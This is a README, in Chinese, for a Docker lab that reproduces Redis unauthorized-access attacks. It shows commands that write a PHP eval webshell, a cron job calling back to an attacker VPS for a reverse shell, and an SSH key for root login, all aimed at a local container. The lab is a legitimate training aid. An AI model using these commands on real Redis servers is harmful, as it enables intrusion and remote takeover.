# redis-unauth-hub
基于docker的redis未授权访问漏洞复现环境，用于复现 redis写计划任务、redis写webshell、redis写ssh公钥

你是否遇到过这样的烦恼：
1. redis未授权访问漏洞复现困难，dockerhub中的redis镜像仅有redis服务
2. 因为ubuntu的限制，redis无法写计划任务反弹shell
3. 复现redis写计划任务、redis写webshell、redis写ssh公钥需要分别搭建虚拟机，并安装相应服务

`redis-unauth-hub` 帮你解决

### 使用方法

#### 自行构建docker镜像

1. 下载/克隆 仓库到本地
```
git clone https://github.com/ajisai-babu/redis-unauth-hub
```
2. 构建docker镜像
```
docker build -t redis-unauth-hub .
```
3. 开启容器
```
docker run -d -p 10081:80 -p 10022:22 -p 16379:6379 redis-unauth-hub
```

备注：镜像默认开启了 22 、80、6379 端口，可以使用如下命令查看
```
docker inspect redis-unauth-hub
```

#### dockerhub拉取镜像(不推荐)
```
docker pull yanglisianthus/redis-unauth-hub

docker run -d -p 10081:80 -p 10022:22 -p 16379:6379 redis-unauth-hub
```
### 复现指南 
> 下列复现均是在本地（Kali Linux）搭建的docker环境

推荐工具 ： https://github.com/yuyan-sec/RedisEXP

1. 写webshell：
```
./RedisEXP -m shell -r 127.0.0.1 -p 16379 -rp /var/www/html -rf shell.php -s PD9waHAgZXZhbCgkX1JFUVVFU1RbY21kXSk7Pz4= -b
```
访问 http://127.0.0.1:10081/shell.php?cmd=phpinfo();

2. 写计划任务：

VPS服务器开启监听
```
nc -lvnp 9001
```
```
./RedisEXP -m cron -r 127.0.0.1 -p 16379 -L VPS服务器IP地址 -P 9001
```

3. 写ssh公钥
```
./RedisEXP  -m ssh -r 127.0.0.1 -p 16379 -u root -s "自己替换公钥字符串"
```
连接
```
ssh root@127.0.0.1 -p10022 -i id_rsa
```

### 为什么没有主从复制
本仓库提供的redis版本为3.2.11，没有主从复制功能
复现主从复制只需要拉取一个redis 4.x 或 5.x 版本的镜像即可复现，无需其他服务，如
```
docker run -p 6379:6379 -d damonevking/redis5.0 redis-server　
```
